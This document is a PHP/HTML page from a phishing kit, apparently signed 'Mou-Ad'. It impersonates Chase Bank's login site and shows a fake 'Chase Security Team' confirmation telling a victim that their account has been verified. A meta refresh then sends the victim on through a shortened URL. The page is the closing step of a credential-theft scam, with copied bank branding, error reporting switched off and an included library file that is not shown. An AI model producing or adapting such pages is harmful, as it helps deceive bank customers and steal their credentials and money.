<?php
/*
Mou-Ad
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on');
ob_start();
include_once 'lib.php';
?>
    <!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
 class="no-js" dir="ltr" lang="en">
<head>
  <meta http-equiv="Content-Type"
 content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible"
 content="IE=edge">
  <meta name="msapplication-config"
 content="none">
  <title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport"
 content="width=device-width, initial-scale=1.0">


<!--[if lte IE 8]>
        <link rel="stylesheet" type="text/css" media="all" href="" />
        <![endif]-->
        <link rel="shortcut icon" href="css2/chasefavicon.ico" />
  <link rel="apple-touch-icon"
 sizes="152x152"
 href="css2/chase-touch-icon-152x152.png">
  <link rel="apple-touch-icon"
 sizes="120x120"
 href="css2/chase-touch-icon-120x120.png">
  <link rel="apple-touch-icon"
 sizes="76x76"
 href="css2/chase-touch-icon-76x76.png">
  <link rel="apple-touch-icon"
 href="css2/chase-touch-icon.png">
  <meta name="apple-mobile-web-app-capable"
 content="yes">
  <meta
 name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
  <link rel="apple-touch-startup-image"
 href=""
 media="screen and (max-device-width: 320px)">
  <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('css2/opensans-regular.eot?#iefix') format('embedded-opentype'),url('css2/opensans-regular.woff') format('woff'),url('css2/opensans-regular.ttf') format('truetype'),url('') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('css2/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('') format('woff'),url('css2/opensans-semibold.ttf') format('truetype'),url('') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('css2/opensans-light.eot?#iefix') format('embedded-opentype'),url('css2/opensans-light.woff') format('woff'),url('css2/opensans-light.ttf') format('truetype'),url('css2/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('css2/videoplayer.eot?#iefix') format('embedded-opentype'),url('css/videoplayer.woff') format('woff'),url('css2/videoplayer.ttf') format('truetype'),url('') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
  <link rel="stylesheet"
 href="css2/blue-ui.css">
  <link rel="stylesheet"
 href="css/logon.css">
 
  <style type="text/css">.jpui.background.image { background-image: url(css/background.mobile.night.7.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(css/background.mobile.night.7.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(css/background.tablet.night.7.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(css/background.desktop.night.7.jpeg); } }</style>
</head>
<body style="height: 100%;"
 data-has-view="true">
<div>
<div class="homepage" tabindex="-1">
<div id="sitemessage" role="region"
 aria-labelledby="site-messages-heading"
 class="toggle-aria-hidden" aria-hidden="true"
 data-has-view="true">
<div>
<div id="siteMessageAda"
 aria-live="polite">
<h2 id="site-messages-heading"
 class="util accessible-text"
 data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You
have no more site alerts</h2>
</div>
</div>
</div>

<header id="logon-summary-menu"
 class="toggle-aria-hidden" data-has-view="true"></header>
<div
 class="logon header jpui transparent navigation bar">


     <img style="max-width: 80%;"   src="chase.png"  />

</div>

</div>



<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>

</div>
</div>
<div class="container logon">
<div>
<div class="container logon">
<div>
<div class="jpui background image fixed show-xs show-sm" id="geoImage"></div>
</div>
<div class="row">
<div id="logoffbox" class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">
<h3 tabindex="-1" id="logoff-header" class="u-focus in-progress">You're
being signed out.</h3>
</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>
</div>
</div>
</div>
</div>
<div id="logonbox" class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">
<form id="login-form" method="post" autocomplete="off" action="https://goo.gl/uFikN1">
  <div id="validator-error-header" class="hide-xs">
  <div id="logon-error" class="jpui error inverted primary alert error" role="region">
  <div class="icon"><span id="type-icon-logon-error"></span></div>
  <div class="icon background"></div>
  <div id="content-logon-error" class="content wrap">
  <h2 class="title" tabindex="-1" id="inner-logon-error"><span class="util accessible-text" id="icon-logon-error">Important: </span></h2>
  </div>
  </div>
  </div>
  <strong style="border: 0px none ; margin: 0px; padding: 0px; color: rgb(17, 122, 202); font-family: inherit; font-size: inherit; font-style: inherit; font-variant: inherit; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-weight: inherit; font-stretch: inherit; line-height: inherit; vertical-align: baseline;"></strong>
  <span style=" margin: 0px; padding: 0px; font-style: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-stretch: inherit; font-size: 15px; line-height: inherit; font-family: Arial; vertical-align: baseline;  color: rgb(105, 105, 105);"><strong style="border: 0px none ; margin: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline;">Thank You  :</strong></span><br>
  <div>
  <div>
  <div>
  <div>
  <div =""=""><span style="border: 0px none ; margin: 0px; padding: 0px; color: rgb(0, 0, 0); font-style: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; font-stretch: inherit; font-size: 13px; line-height: inherit; font-family: Arial; vertical-align: baseline; "><br>
  <strong style="border: 0px none ; margin: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline;">By 01/02/2018, 12:32 pm you have verified your account ending in - <span class="Apple-converted-space"></span></strong>. Your're now redirecting to Chase.com and login back.<br>
  <br>
We are sorry for the inconvenience that this might have caused you. We
will update your account within the next 24 hours.<br>
  <br>
  <strong style="border: 0px none ; margin: 0px; padding: 0px; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; vertical-align: baseline;">Chase
Security Team</strong></span></div>
  </div>
  </div>
  </div>
  </div>
  <div class="row"> </div>
  <div></div>
  <div></div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12"><span
 class="follow-us-text">Follow us:</span>
<ul class="icon-links">
  <li class="facebook"><a
 href=""><i
 class="jpui facebook icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="instagram"><a
 href=""><i
 class="jpui instagram icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="twitter"><a
 href=""><i
 class="jpui twitter icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="youtube"><a
 href=""><i
 class="jpui youtube icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="linkedin"><a
 href=""><i
 class="jpui linkedin icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
</ul>
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a
 href="">Contact
us</a></li>
  <li><a
 href="">Privacy</a></li>
  <li><a
 href="">Security</a></li>
  <li><a
 href="">Terms
of use</a></li>
  <li><a
 href="">Our
commitment to accessibility</a></li>
  <li><a
 href="">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a
 href="">Fair
Lending</a></li>
  <li><a
 href="">About
Chase</a></li>
  <li><a
 href="">J.P.
Morgan</a></li>
  <li><a
 href="">JPMorgan
Chase &amp; Co.</a></li>
  <li><a
 href="">Careers</a></li>
  <li><a
 href="" lang="es">Espa&ntilde;ol</a></li>
  <li><a
 href="">Chase
Canada</a></li>
  <li><a
 href="">Site map</a></li>
  <li>Member FDIC</li>
  <li><i
 class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">&copy;
2017 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">&copy;
2018 JPMorgan Chase &amp; Co.</span><br>
<a
 href=""
 class="NOTELINK"
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon"
 aria-hidden="true"></i></a><br>
<a
 href="">Our
commitment to accessibility<i
 class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>
</div>
</div>
<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>
</div>
</body>
</html>
</p> <meta HTTP-EQUIV='REFRESH' content='6; url=https://goo.gl/uFikN1'/>
